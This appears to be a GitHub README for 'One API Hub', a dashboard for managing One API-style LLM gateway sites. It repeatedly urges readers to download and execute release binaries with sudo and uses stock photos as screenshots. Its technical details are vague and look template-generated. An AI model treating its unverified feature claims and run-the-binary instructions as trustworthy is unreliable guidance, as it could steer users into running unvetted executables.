https://github.com/khuzaima1216/one-api-hub/releases

[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?logo=github&style=for-the-badge)](https://github.com/khuzaima1216/one-api-hub/releases)
[![Topics](https://img.shields.io/badge/topics-llm%2Cnew--api-lightgrey?style=flat-square)](https://github.com/khuzaima1216/one-api-hub)
[![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)

# One API Hub — Lightweight Console for Managing One API Sites

![Dashboard preview](https://images.unsplash.com/photo-1522071820081-009f0129c71c?auto=format&fit=crop&w=1400&q=80)

A compact web console that lets you register, monitor, and manage multiple One API compatible sites from a single pane. One API Hub focuses on clarity, low resource use, and fast operations. It works with One API implementations and gateways that follow the One API standard.

- Topics: llm, new-api
- Platform: Web dashboard + CLI
- Protocols: HTTP(s), WebSocket, OpenAPI/One API-style endpoints

Quick links
- Releases (download and execute release asset): https://github.com/khuzaima1216/one-api-hub/releases
- Repository: https://github.com/khuzaima1216/one-api-hub

<!-- Badges and visuals above give a quick starting point. -->

## Why One API Hub? 🔧

- Manage multiple One API sites from one console.
- Track health, load, and latency for each site.
- Route requests to a preferred endpoint or a fallback.
- Store API keys and rotate them per site.
- Test requests with a built-in API client and sample prompts for LLM endpoints.

Target users
- DevOps engineers who run multiple One API nodes.
- Developers who integrate with several One API providers.
- Teams that need a single control plane to test, route, and monitor One API endpoints.

## Features ✨

- Multi-site registry with labels, tags, and priorities.
- Health checks with configurable intervals and thresholds.
- Real-time logs and basic request tracing.
- Built-in API test runner for HTTP and WebSocket targets.
- Secrets manager for API keys and bearer tokens.
- Simple routing rules and failover order.
- Lightweight UI built in Vue/React (configurable) and a small Go/Node backend.
- CLI for automation and scripting.

## Architecture overview 🏗️

- Frontend: Static SPA served by the backend or a CDN.
- Backend: Minimal REST API to manage sites, run checks, and proxy test calls.
- Storage: SQLite for single-node installs; Postgres optional for clusters.
- Health checks: Push and pull modes. Pull is periodic polling. Push lets sites register heartbeat.
- Security: Transport-level TLS for all endpoints. Secrets encrypted at rest.

Example flow
1. Admin adds site A with base URL and API key.
2. Hub runs a health check and marks site A as healthy.
3. Developer runs a test request via the console to site A.
4. Hub logs the request and shows latency and response status.
5. If site A fails, Hub routes test requests to site B per priority.

## Installation — download and execute release asset ⬇️

Download the latest release asset from the Releases page and execute it on your server. The release contains platform builds and setup scripts.

- Visit the Releases page and download the package for your OS: https://github.com/khuzaima1216/one-api-hub/releases
- The release asset is named one-api-hub_<version>_<platform>.tar.gz or one-api-hub_<version>_windows.zip.
- Extract and run the binary or installer.

Example (Linux)
- curl -L -o one-api-hub.tar.gz "https://github.com/khuzaima1216/one-api-hub/releases/download/vX.Y.Z/one-api-hub_linux_x64.tar.gz"
- tar xzf one-api-hub.tar.gz
- sudo mv one-api-hub /usr/local/bin/
- sudo systemctl enable --now one-api-hub

Example (Docker)
- docker pull khuzaima1216/one-api-hub:latest
- docker run -d --name one-api-hub -p 8080:8080 \
  -v oneapi-data:/data \
  -e ADMIN_TOKEN=changeme \
  khuzaima1216/one-api-hub:latest

If the release page changes, check the Releases section on GitHub to find the latest asset.

## Quick start (5 minutes)

1. Install binary or run Docker as shown above.
2. Point your browser to http://localhost:8080.
3. Login with ADMIN_TOKEN or create the first admin user.
4. Add a site:
   - Name: ExampleLLM
   - Base URL: https://example.oneapi.com/v1
   - API Key: sk-*****
   - Check interval: 30s
5. Run a test prompt in the "API Console".

## Configuration

Config file (YAML or ENV)
- PORT: port to bind (default 8080)
- DB_PATH: sqlite file path or postgres DSN
- ADMIN_TOKEN: initial admin token
- TLS_CERT / TLS_KEY: for HTTPS
- LOG_LEVEL: debug, info, warn, error

Sample config (YAML)
server:
  port: 8080
storage:
  sqlite: /data/oneapi.db
auth:
  admin_token: "change-me"

Secrets
- Store API keys in the built-in vault.
- Rotate keys via the site edit screen or API.
- The vault uses AES-GCM with a key derived from a master key. Supply a MASTER_KEY env var for production.

## Web UI walkthrough

- Dashboard: Shows site status, uptime, requests per minute, and current load.
- Sites: Add, edit, delete sites. Set priority and tags.
- Console: Build requests, set headers, body, and run. For LLM endpoints, send prompts and view streaming responses.
- Logs: Filter by site, status, and time range.
- Alerts: Basic alert rules (e.g., mark site down after N failed checks).
- Settings: Backup, restore, exports, and security settings.

Screenshots
- Dashboard: https://images.unsplash.com/photo-1522071820081-009f0129c71c?auto=format&fit=crop&w=1200&q=60
- Console mockup: https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&w=1200&q=60

## API & CLI

REST API endpoints
- GET /api/sites — list sites
- POST /api/sites — add site
- GET /api/sites/{id} — site details
- POST /api/sites/{id}/test — run a test request
- GET /api/health — hub health

CLI sample
- hubctl sites list
- hubctl sites add --name Example --url https://example.oneapi.com --key sk-xxx
- hubctl test --site Example --method POST --path /v1/generate --data '{"prompt":"Hello"}'

Auth
- Use ADMIN_TOKEN or JWT for API calls.
- Generate short-lived tokens for automation.

## Routing and failover

- Add multiple endpoints per logical site.
- Assign priorities (1 highest).
- Use round-robin or priority routing.
- Configure per-site timeout and retry policy.
- Hub can proxy requests and stream responses for LLM-style endpoints.

Routing rule example
- Primary: https://api-primary.oneapi.com
- Fallback: https://api-fallback.oneapi.com
- Policy: Priority -> timeout 3s -> 2 retries

## Monitoring and alerts

- Health checks run at interval per site.
- Metrics exported in Prometheus format at /metrics.
- Alert rules fire when consecutive checks fail.
- Notifications: webhook, Slack, or email.

Prometheus example scrape
- metrics_path: /metrics
- static_configs:
  - targets: ['host:8080']

## Security and best practices

- Run behind a reverse proxy or load balancer.
- Use TLS for all external traffic.
- Keep MASTER_KEY secret and rotate it if compromised.
- Limit admin token scope and issue per-host machine tokens.
- Use network ACLs to restrict access to the management endpoint.

## Troubleshooting

- If the UI does not load: confirm service is running and port is correct.
- If site tests fail: check base URL and API key.
- If health checks mark site down: increase timeout and check network path.
- If DB lock occurs on SQLite: switch to Postgres for concurrent workloads.

## Extending One API Hub

- Add custom health checks (validate JSON schema, token validity).
- Integrate with other control planes via webhooks.
- Add provider-specific adapters for enhanced telemetry.
- Plug in custom auth providers (OAuth2, SSO).

## Contributing

- Fork repo, create a branch, open a pull request with tests.
- Follow the code style in .editorconfig and linter rules.
- Add small focused commits and clear PR description.
- Use the issues tracker to suggest features or report bugs.

How to run tests
- Install dev deps: make setup
- Run unit tests: make test
- Run e2e: make e2e (requires Docker)

## Release notes & downloads

Download and execute the release asset from the Releases page:
https://github.com/khuzaima1216/one-api-hub/releases

Releases include binaries for major OSes, Docker images, and setup scripts. Each release contains a changelog and migration notes.

## FAQ

Q: Which APIs does this support?
A: Any One API compatible endpoint that follows the One API contract. Works with LLM endpoints over HTTP and WebSocket.

Q: Can I run this in Kubernetes?
A: Yes. Provide a secret for MASTER_KEY and set DB to Postgres. Use a standard Deployment and Service.

Q: Is there an audit log?
A: Yes. The app logs admin actions and test requests. Logs export to a file or a syslog backend.

## License

MIT License. See LICENSE file for details.

## Credits

- Design: UI uses open-source component libraries.
- Icons and images: Unsplash and public icon sets.
- Built and maintained by the community and contributors.